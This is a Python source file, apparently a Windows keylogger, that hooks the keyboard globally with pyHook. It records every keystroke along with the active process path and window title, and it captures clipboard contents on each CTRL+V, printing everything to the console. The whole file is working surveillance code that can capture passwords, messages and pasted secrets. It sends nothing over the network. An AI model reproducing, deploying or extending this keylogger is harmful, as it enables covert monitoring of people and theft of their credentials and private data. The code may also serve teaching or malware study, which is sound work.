from ctypes import sizeof, WinDLL, create_unicode_buffer, byref
from ctypes.wintypes import DWORD, HKL, MAX_PATH
from win32con import PROCESS_QUERY_INFORMATION, PROCESS_VM_READ
from pyHook import HookManager, GetKeyState, HookConstants
import pythoncom
import os
import win32clipboard

USER32   = WinDLL('user32', use_last_error=True)
KERNEL32 = WinDLL('kernel32', use_last_error=True)
PSAPI    = WinDLL('psapi', use_last_error=True)

current_window_name = None

current_pid = -1

# TODO: Configure OEM keyboard keys based on loaded .klc file.
shift_keys = {"1":          ["1", "!"],
              "2":          ["2", "@"],
              "3":          ["3", "#"],
              "4":          ["4", "$"],
              "5":          ["5", "%"],
              "6":          ["6", "^"],
              "7":          ["7", "&"],
              "8":          ["8", "*"],
              "9":          ["9", "("],
              "0":          ["0", ")"],
              "Oem_Minus":  ["-", "_"],
              "Oem_Plus":   ["=", "+"],
              "Oem_Comma":  [",", "<"],
              "Oem_Period": [".", ">"],
              "Oem_1":      [";", ":"],
              "Oem_2":      ["/", "?"],
              "Oem_3":      ["`", "~"],
              "Oem_4":      ["[]", "{"],
              "Oem_5":      ["\\", "|"],
              "Oem_6":      ["]", "}"],
              "Oem_7":      ["\'", "\""]}


def get_current_process():
    """
    Prints out the user selected window information when the selected window changes.
    :return: None
    """
    global current_pid

    # Get a handle to the foreground window.
    h_window = USER32.GetForegroundWindow()

    if h_window is not None:
        # Get the process ID of the selected window.
        pid = DWORD()
        USER32.GetWindowThreadProcessId(h_window, byref(pid))

        # Check if the user has selected a new window.
        if pid.value != current_pid:
            current_pid = pid.value

            # Get the file path and window title associated with the selected window.
            file_path    = create_unicode_buffer(MAX_PATH)
            window_title = create_unicode_buffer(MAX_PATH)

            h_process = KERNEL32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, pid)

            # Get the file name of the foreground window.
            PSAPI.GetProcessImageFileNameW(h_process, byref(file_path), sizeof(file_path))

            # Get the title of the foreground window.
            USER32.GetWindowTextW(h_window, byref(window_title), sizeof(window_title))

            # Print out information of the foreground window.
            print("\r\n\r\n[ PID: {id} - {path} - {info} ]\r\n".format(id=pid.value,
                                                                       path=file_path.value,
                                                                       info=window_title.value))
            # Close process handle.
            KERNEL32.CloseHandle(h_process)

    # Close foreground window handle.
    KERNEL32.CloseHandle(h_window)


def KeyDownEvent(event):
    get_current_process()

    ctrl_pressed  = GetKeyState(HookConstants.VKeyToID('VK_CONTROL'))
    shift_pressed = GetKeyState(HookConstants.VKeyToID('VK_SHIFT'))
    caps_lock     = GetKeyState(HookConstants.VKeyToID('VK_CAPITAL'))

    key = HookConstants.IDToName(event.KeyID)
    output = ""

    # Handle CTRL+[] shortcuts.
    if ctrl_pressed and "control" not in key:
        if key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            output = "\r\nCTRL+{} Contents:\r\n\r\n{}\r\n".format(key, pasted_value)
        else:
            output = "CTRL+{}".format(key)
    # Handle SHIFT modifiable keys.
    elif key in shift_keys:
        if shift_pressed:
            output = shift_keys[key][1]
        else:
            output = shift_keys[key][0]
    # Handle capitalized keys.
    elif (shift_pressed and not caps_lock) or \
         (caps_lock and not shift_pressed):
        output = key.upper()
    else:
        output = key.lower()

    print("[{}]".format(output), end="", flush=True)

    # Pass execution to next hook registered
    return True


if __name__ == "__main__":
    # Currently only supports Windows.
    if os.name == 'nt':
        key_layout = create_unicode_buffer(MAX_PATH)
        if USER32.GetKeyboardLayoutNameW(byref(key_layout)):
            print("KeyBoard Layout: {}".format(key_layout.value))
        else:
            print("Unknown KeyBoard Layout")

        # Create a hook manager and bind events
        hook_manager = HookManager()
        hook_manager.KeyDown = KeyDownEvent

        # Register the hook and execute forever
        hook_manager.HookKeyboard()

        pythoncom.PumpMessages()
